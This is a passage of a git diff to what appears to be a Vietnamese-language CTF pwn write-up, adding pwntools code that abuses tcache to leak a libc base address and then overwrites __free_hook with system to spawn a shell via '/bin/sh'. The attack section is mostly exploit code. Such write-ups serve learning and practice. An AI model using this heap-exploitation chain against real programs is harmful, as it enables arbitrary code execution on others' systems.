@@ -52,4 +52,30 @@
   ```
   - ![image](https://user-images.githubusercontent.com/113702087/220081883-10198633-7bb4-4635-b8cb-092b55a79ee3.png)
   - Sau khi đưa libc_stderr vào tcache ta free(fakechunk) tcache 0x90: `fakechunk->libc_stderr`
-  - 
+  ```
+  malloc(size_ + 40, b'a')
+malloc(size_ + 40, b'a')
+freeandinfo(b'2')
+  ```
+  - ![image](https://user-images.githubusercontent.com/113702087/220082718-35ee95cc-6b5b-40b2-8d54-055eb2a4ebec.png)
+  ```
+  freeandinfo(b'3')
+r.recvuntil(b'Name :')
+r.recv(16)
+out = r.recv(8)
+libc.address = u64(out) - 0x3ec680
+print(hex(libc.address))
+  ```
+ ### Overwrite free_hook và lấy shell
+  ```
+  malloc(size_ + 56, b'a')
+malloc(size_ + 56, p64(libc.sym['__free_hook']))
+malloc(size_ + 120, b'a')
+malloc(size_ + 120, p64(libc.sym['system']))
+
+malloc(size_ + 112, b'/bin/sh')
+freeandinfo(b'2')
+  ```
+  - ![image](https://user-images.githubusercontent.com/113702087/220083309-d75596e1-2280-48f3-9445-32870d89c9f7.png)
+  - ![image](https://user-images.githubusercontent.com/113702087/220083419-b37a7326-e416-4023-aaca-f1cbb5b3303e.png)
+
